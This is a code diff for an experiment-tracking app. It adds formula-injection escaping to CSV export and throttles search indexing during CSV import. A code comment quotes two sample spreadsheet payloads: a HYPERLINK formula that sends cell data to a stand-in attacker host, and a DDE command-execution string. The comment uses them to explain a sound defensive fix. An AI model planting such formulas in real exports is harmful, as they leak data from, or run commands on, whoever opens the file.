@@ -12,8 +12,23 @@ import type { ActionResult, ExperimentSearchParams, SavedView } from "@/lib/type
 import type { RowError } from "@/lib/experiments/import";
 
 // Quote a CSV cell only when it contains a comma, quote, or newline.
+//
+// The leading-apostrophe branch is formula injection: Excel and Sheets
+// evaluate a cell beginning =, +, -, @, tab or CR, so a scientist who types
+// `=HYPERLINK("http://attacker/?d="&A1,"x")` into an observations field has
+// written something that runs on whoever opens the export. It is fixed here
+// rather than on import for two reasons: the import is not the only way in
+// (the ordinary new/edit form accepts the same text, and every pre-existing
+// row already might), and sanitising on the way in would permanently mutate
+// stored scientific data.
+//
+// The numeric gate is what keeps this from corrupting real values. A leading
+// minus is only dangerous when the cell is not a plain number: -1.5 is a
+// legitimate pH and -78 a legitimate temperature, and both stay untouched,
+// while `-1+cmd|'/c calc'!A0` gets the apostrophe.
 function csvCell(v: unknown): string {
-  const s = v == null ? "" : String(v);
+  let s = v == null ? "" : String(v);
+  if (/^[=+\-@\t\r]/.test(s) && !Number.isFinite(Number(s))) s = `'${s}`;
   return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
@@ -81,7 +96,14 @@ export async function importExperimentsCsvAction(csvText: string): Promise<Actio
   const created: string[] = [];
   try {
     for (const input of inputs) {
-      created.push(await experimentsService.createExperiment(supabase, user.id, workspaceId, input));
+      // skipIndexFastPath: the durable index_jobs row is written by the DB
+      // trigger regardless, so these still get embedded -- by the poller,
+      // 20 at a time, instead of 500 at once against an unmetered API.
+      created.push(
+        await experimentsService.createExperiment(supabase, user.id, workspaceId, input, undefined, {
+          skipIndexFastPath: true,
+        })
+      );
     }
   } catch (e) {
     const failure = toActionResult("importExperimentsCsvAction", e);
